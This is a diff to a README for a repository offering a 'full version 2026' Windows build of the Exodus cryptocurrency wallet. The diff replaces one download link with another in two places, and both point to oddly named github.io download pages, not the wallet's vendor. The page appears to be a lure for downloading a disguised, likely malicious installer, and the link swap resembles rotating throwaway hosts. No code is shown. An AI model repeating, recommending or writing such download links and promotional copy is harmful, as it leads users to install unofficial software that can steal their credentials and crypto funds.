@@ -2,7 +2,7 @@
 
 This repository provides the complete package for **Exodus Wallet Desktop Full version 2026**, tailored for Windows users seeking a robust cryptocurrency management tool. With integrated exchange capabilities and full feature access, it streamlines portfolio tracking and asset swaps on desktop systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Overview
 
@@ -63,7 +63,7 @@ Exodus Wallet Desktop Full incorporates advanced encryption and security protoco
 
 ## Download
 
-[Get the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Get the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Disclaimer
 
